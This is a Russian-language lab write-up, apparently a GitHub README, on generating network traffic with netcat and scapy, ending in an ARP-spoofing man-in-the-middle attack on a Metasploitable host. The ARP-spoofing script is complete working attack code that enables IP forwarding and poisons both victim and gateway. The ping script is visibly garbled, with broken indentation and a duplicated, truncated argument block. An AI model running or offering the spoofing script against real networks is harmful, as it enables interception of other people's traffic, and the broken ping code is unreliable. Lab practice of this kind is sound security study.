<img width="579" height="65" alt="изображение" src="https://github.com/user-attachments/assets/6772e4f4-4aa4-449b-89b8-6414856e7512" /><img width="438" height="35" alt="изображение" src="https://github.com/user-attachments/assets/72d7fe38-4396-4a77-8ab0-dff19322c577" /># Генерация трафика

## Netcat

Генерация **html** трафика используя `netcat`:

<img width="616" height="336" alt="изображение" src="https://github.com/user-attachments/assets/1e5ddafb-51ef-48db-a133-70ab8efcc24a" />

## Ping

### Настройка **scapy**

Перед установкой создается виртуальное окружение через `venv`, куда после устанавливается `scapy`:

<img width="614" height="328" alt="изображение" src="https://github.com/user-attachments/assets/ae96bce3-292e-4b8a-a508-9c09e86516da" />

### Генерация ping

Скрипт для генерации `ping` запросов:

```py
#!/usr/bin/env python3
from scapy.all import *
import argparse
import time

def ping(target, count, timeout, verbose=False):
    print(f"\n[*] Scanning {target} with {count} packets...\n")
        
    for i in range(count):
         packet = IP(dst=target) / ICMP(id=i, seq=i)
        
        reply = sr1(packet, timeout=timeout, verbose=verbose)
        
        if reply:
            print(f"[+] Pong from {reply.src} | seq={reply[ICMP].seq} | ttl={reply.ttl}")
        else:
            print(f"[-] Timeout for packet {i+1}")

def ping_batch(target, count, timeout, interval=0.5):
    print(f"\n[*] Batch scanning {target} with {count} packets...\n")
    
    for i in range(count):  
        packet = IP(dst=target) / ICMP(id=i, seq=i)
        reply = sr1(packet, timeout=timeout, verbose=False)
        
        if reply:
            print(f"[+] Pong from {reply.src} | seq={reply[ICMP].seq}")
        else:
            print(f"[-] Timeout for packet {i+1}")
        
        time.sleep(interval) 

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scapy Ping Tool")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("-c", "--count", type=int, default=4, help="Number of packets (default: 4)")
    parser.add_argument("-t", "--timeout", type=int, default=2, help="Timeout per packet in seconds (default:>
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets in seconds")
    
    args = parser.parse_args()
    
    if args.interval > 0:
        ping_batch(args.target, args.count, args.timeout, args.interval)
    else:
        ping(args.target, args.count, args.timeout, args.verbose)
parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets in seconds")
    
    args = parser.parse_args()
    
    if args.interval > 0:
        ping_batch(args.target, args.count, args.timeout, args.interval)
    else:
        ping(args.target, args.count, args.timeout, args.verbose)
```

- Успешный `ping`:

<img width="380" height="160" alt="изображение" src="https://github.com/user-attachments/assets/9c9842d2-3e38-4e59-ab52-cbe70a4caa27" />

- Неуспешный `ping`:

<img width="365" height="159" alt="изображение" src="https://github.com/user-attachments/assets/27c9c4a5-2a5f-4ccf-8870-dbdb20ceb5ad" />

## ARP-Spoofing

Скрипт для генерации `ARP-Spoofing` запросов:

```py
#!/usr/bin/env python3
from scapy.all import *
import time
import sys

def enable_ip_forward():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[*] IP forwarding enabled")

def get_mac(ip, iface="eth0"):
    """Получить MAC через ARP-запрос"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=iface)
    if ans:
        return ans[0][1].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip, target_mac, iface="eth0"):
    """Отправка поддельного ARP-ответа"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=iface)

def arp_restore(target_ip, source_ip, target_mac, source_mac, iface="eth0"):
    """Восстановление ARP-таблицы"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=False, iface=iface)

def get_my_mac(iface="eth0"):
    """Получить свой MAC"""
    return get_if_hwaddr(iface)

def main():
    # === НАСТРОЙКИ ДЛЯ ВАШЕЙ СЕТИ ===
    IFACE = "eth0"                      # Ваш интерфейс в LAN
    TARGET = "192.168.10.50"            # Metasploitable (жертва)
    GATEWAY = "192.168.10.1"            # Роутер (реальный шлюз)
    
    print(f"[*] Интерфейс: {IFACE}")
    print(f"[*] Жертва: {TARGET}")
    print(f"[*] Шлюз: {GATEWAY}")
    
    # Получаем MAC-адреса
    target_mac = get_mac(TARGET, IFACE)
    gateway_mac = get_mac(GATEWAY, IFACE)
    
    if not target_mac:
        print(f"[-] Не удалось получить MAC для {TARGET}")
        sys.exit(1)
    
    if not gateway_mac:
        print(f"[-] Не удалось получить MAC для {GATEWAY}")
        sys.exit(1)
    
    print(f"[+] MAC жертвы ({TARGET}): {target_mac}")
    print(f"[+] MAC шлюза ({GATEWAY}): {gateway_mac}")
    
    enable_ip_forward()
    
    print("\n[*] Атака запущена. Metasploitable думает, что мы — шлюз...")
    print("[*] Нажмите Ctrl+C для остановки\n")
    
    try:
        while True:
            # Говорим Metasploitable, что мы — шлюз
            arp_spoof(TARGET, GATEWAY, target_mac, IFACE)
            # (Опционально) говорим шлюзу, что мы — Metasploitable
            arp_spoof(GATEWAY, TARGET, gateway_mac, IFACE)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Остановка. Восстановление сети...")
        arp_restore(TARGET, GATEWAY, target_mac, gateway_mac, IFACE)
        arp_restore(GATEWAY, TARGET, gateway_mac, target_mac, IFACE)
        print("[+] Готово")

if __name__ == "__main__":
    main()
```

Проверка шлюза на цели:

<img width="579" height="65" alt="изображение" src="https://github.com/user-attachments/assets/07c515e8-09af-4add-89c7-07874f2e339b" />

Выполнение скрипта:

<img width="848" height="288" alt="изображение" src="https://github.com/user-attachments/assets/b630c9ae-020a-46b9-a0e9-a768b79ec86f" />

Снова проверка шлюза:

<img width="573" height="85" alt="изображение" src="https://github.com/user-attachments/assets/6b676420-00a7-4b35-a13e-19d53d6b8658" />

- Теперь `Metasploitable` теперь думает, что `Kali` это еще один шлюз
